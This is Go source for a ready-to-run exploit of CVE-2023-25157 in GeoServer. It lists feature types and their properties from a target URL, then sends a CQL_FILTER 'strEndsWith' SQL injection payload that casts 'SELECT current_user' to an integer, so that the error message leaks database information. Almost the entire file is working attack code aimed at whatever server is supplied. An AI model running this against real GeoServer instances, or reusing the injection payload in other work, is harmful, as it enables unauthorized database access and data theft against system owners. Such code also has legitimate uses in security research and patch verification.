package main

import (
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"

	"github.com/logrusorgru/aurora/v4"
)

//struct for result
type ServiceExceptionReport struct {
	XMLName          xml.Name `xml:"ServiceExceptionReport"`
	Version          string   `xml:"version,attr"`
	ServiceException string   `xml:"ServiceException"`
}

//print ERR when error
func printError() {
	fmt.Print("[")
	fmt.Print(aurora.Red("ERR"))
	fmt.Print("] ")
}

//print INF when informative
func printInfo() {
	fmt.Print("[")
	fmt.Print(aurora.Blue("INF"))
	fmt.Print("] ")
}

//print FTL when fatal/panic
func printFatal() {
	fmt.Print("[")
	fmt.Print(aurora.Red("FTL"))
	fmt.Print("] ")
}

//print YAY when success
func printSucceed() {
	fmt.Print("[")
	fmt.Print(aurora.Green("YAY"))
	fmt.Print("] ")
}

func main() {
	if len(os.Args) == 1 {
		printError()
		fmt.Println("Please provide URL")
		printInfo()
		fmt.Println("Usage: go run CVE-2023-25157.go <URL>")
		printFatal()
		os.Exit(1)
	}
	URL := os.Args[1]
	baseURL := "/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities"
	requestURL := URL + baseURL
	response, err := http.Get(requestURL)
	if err != nil {
		printError()
		fmt.Printf("Error requesting URL : %s\n", err.Error())
		return
	}
	printInfo()
	fmt.Printf("Host is alive; Status Code: %d\n", response.StatusCode)
	if response.StatusCode == 200 {
		defer response.Body.Close()
		data, err := ioutil.ReadAll(response.Body)
		if err != nil {
			printError()
			fmt.Printf("Failed to read content : %s\n", err.Error())
			printFatal()
			os.Exit(1)
		} else {
			printInfo()
			fmt.Println("Reading Content...")
		}
		printInfo()
		fmt.Println("Parsing Content...")
		nameRegex := regexp.MustCompile(`<Name>(.*?)<\/Name>`)
		matches := nameRegex.FindAllStringSubmatch(string(data), -1)
		var names []string
		for _, match := range matches {
			names = append(names, match[1])
		}
		printInfo()
		fmt.Println("Listing available feature names...")
		for _, name := range names {
			printSucceed()
			fmt.Println("- ", name)
		}

		//Other available CQL_FILTER (`PropertyIsLike`,`strStartsWith`,`FeatureId`, `jsonArrayContains`, `Dwithin`)
		//For this case, we'll be using `strEndsWith`
		//https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
		for _, name := range names {
			cqlFilters := []string{"strEndsWith"}
			for _, cqlFilter := range cqlFilters {
				endpoint := fmt.Sprintf("/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=%s&maxFeatures=1&outputFormat=json", name)
				response, err := http.Get(URL + endpoint)
				if err != nil {
					printError()
					fmt.Printf("Request Failed %s\n", err.Error())
					continue
				} else {
					printInfo()
					fmt.Printf("URL: %s, %d\n", URL+endpoint, response.StatusCode)
				}
				defer response.Body.Close()
				if response.StatusCode == 200 {
					jsonData, err := ioutil.ReadAll(response.Body)
					if err != nil {
						printError()
						fmt.Printf("Unable to read JSON data : %s\n", err.Error())
						continue
					} else {
						printInfo()
						fmt.Println("Reading JSON...")
					}
					var featureJSON map[string]interface{}
					err = json.Unmarshal(jsonData, &featureJSON)
					if err != nil {
						printError()
						fmt.Printf("Unable to parse JSON data : %s\n", err.Error())
						continue
					} else {
						printInfo()
						fmt.Println("Parsing JSON data...")
					}
					properties := featureJSON["features"].([]interface{})[0].(map[string]interface{})["properties"].(map[string]interface{})
					propertyNames := make([]string, 0, len(properties))
					for propertyName := range properties {
						propertyNames = append(propertyNames, propertyName)
					}
					printInfo()
					fmt.Printf("Listing available properties for %s\n", name)
					for _, propertyName := range propertyNames {
						printSucceed()
						fmt.Println("- ", propertyName)
					}
					for _, propertyName := range propertyNames {
						printInfo()
						fmt.Printf("Sending requests for property name : %s\n", propertyName)
						search := fmt.Sprintf("/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=%s&CQL_FILTER=%s(%s,'x'')+=+true+and+1=(SELECT+CAST+((SELECT+current_user)+AS+INTEGER))+--+')+=+true", name, cqlFilter, propertyName)
						response, err := http.Get(URL + search)
						if err != nil {
							printError()
							fmt.Printf("Request failed %s\n", err.Error())
							continue
						} else {
							printInfo()
							fmt.Printf("URL: %s, %d\n", URL+search, response.StatusCode)
						}
						defer response.Body.Close()
						if response.StatusCode == 200 {
							bodyData, err := ioutil.ReadAll(response.Body)
							if err != nil {
								printError()
								fmt.Printf("Failed to read response body : %s\n", err.Error())
								continue
							} else {
								printInfo()
								fmt.Println("Reading response body...")
								//xmlData = string(bodyData)
								//fmt.Println(xmlData)
							}
							printInfo()
							fmt.Println("Parsing response...")
							var report ServiceExceptionReport
							err = xml.Unmarshal(bodyData, &report)
							if err != nil {
								printError()
								fmt.Printf("Unable to parse : %s\n", err.Error())
							}
							printSucceed()
							fmt.Println(report.ServiceException)
						} else {
							printError()
							fmt.Println("Unable to Request URL")
						}
					}
				}
			}
		}
	}
}
